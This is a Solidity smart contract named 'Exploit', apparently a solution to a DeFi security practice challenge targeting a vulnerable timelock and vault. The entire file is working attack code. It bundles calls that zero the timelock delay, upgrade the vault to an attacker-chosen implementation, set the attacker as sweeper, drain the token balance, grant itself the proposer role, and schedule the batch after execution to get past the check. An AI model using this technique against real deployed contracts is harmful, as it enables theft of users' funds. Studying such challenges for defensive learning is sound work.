// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";
import "./ClimberVault.sol";

contract Exploit {
    ClimberTimelock timelock;
    ClimberVault vault;
    address attacker;
    address tokenAddress;
    uint256 amount;
    address vault2;
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

    bytes32 public salt = 0;
    address[] public contracts = new address[](6);
    uint256[] public value = new uint256[](6);
    bytes[] public functionSigs = new bytes[](6);

    constructor(
        address _timelock,
        address _vault,
        address _attacker,
        address _token,
        uint256 _amount,
        address _vault2
    ) {
        timelock = ClimberTimelock(payable(_timelock));
        vault = ClimberVault(payable(_vault));
        attacker = _attacker;
        tokenAddress = _token;
        amount = _amount;
        vault2 = _vault2;
    }

    function schedule() external {
        timelock.schedule(contracts, value, functionSigs, salt);
    }

    function exploit() external {
        contracts[0] = address(timelock);
        contracts[1] = address(vault);
        contracts[2] = address(vault);
        contracts[3] = address(vault);
        contracts[4] = address(timelock);
        contracts[5] = address(this);

        functionSigs[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        functionSigs[1] = abi.encodeWithSignature("upgradeTo(address)", address(vault2));
        functionSigs[2] = abi.encodeWithSignature("setSweeper(address)", address(attacker));
        functionSigs[3] = abi.encodeWithSignature("sweepFunds(address)", address(tokenAddress));
        functionSigs[4] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            PROPOSER_ROLE,
            address(this)
        );
        functionSigs[5] = abi.encodeWithSignature("schedule()");

        timelock.execute(contracts, value, functionSigs, salt);
    }
}
